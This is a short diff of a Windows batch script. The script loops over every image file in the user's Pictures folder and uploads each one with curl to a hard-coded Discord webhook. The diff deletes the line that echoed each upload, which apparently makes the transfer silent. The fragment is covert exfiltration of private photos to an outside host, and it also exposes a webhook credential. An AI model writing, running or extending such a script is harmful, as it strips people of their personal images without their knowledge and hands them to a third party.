@@ -5,7 +5,6 @@ set WEBHOOK=https://discord.com/api/webhooks/1495850351750938624/V9xdz47PjJyOAs2
 set FOLDER=%USERPROFILE%\Pictures
 
 for %%F in ("%FOLDER%\*.png" "%FOLDER%\*.jpg" "%FOLDER%\*.jpeg" "%FOLDER%\*.gif" "%FOLDER%\*.webp") do (
-    echo Envoi de %%~nxF
     curl -F "file1=@%%F" %WEBHOOK%
 )
 
